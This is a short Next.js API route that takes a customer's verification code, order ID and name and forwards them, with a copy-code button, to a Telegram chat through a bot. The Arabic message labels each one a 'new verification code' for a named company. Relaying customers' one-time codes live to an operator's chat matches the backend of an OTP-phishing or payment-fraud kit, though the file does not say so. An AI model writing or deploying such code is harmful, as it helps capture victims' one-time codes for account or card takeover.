import { NextRequest, NextResponse } from "next/server";

async function sendToTelegram(payload: object): Promise<boolean> {
  const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  const opts = { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) };
  for (let attempt = 0; attempt < 2; attempt++) {
    try {
      const res = await fetch(url, opts);
      if (res.ok) return true;
    } catch (_) {}
    if (attempt === 0) await new Promise(r => setTimeout(r, 1500));
  }
  return false;
}

export async function POST(req: NextRequest) {
  const { code, orderId, customerName, customerId } = await req.json();

  const text = [
    `🔐 كود تحقق جديد`,
    `🏢 مؤسسة سهلناها التقنية`,
    `🆔 رقم الطلب: ${orderId ?? "—"}`,
    `👤 اسم العميل: ${customerName ?? "—"}`,
    `📟 الكود: ${code}`,
  ].join("\n");

  const reply_markup = {
    inline_keyboard: [[{ text: "📋 نسخ الكود", copy_text: { text: code } }]],
  };

  const sent = await sendToTelegram({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup });

  return NextResponse.json({ ok: sent });
}
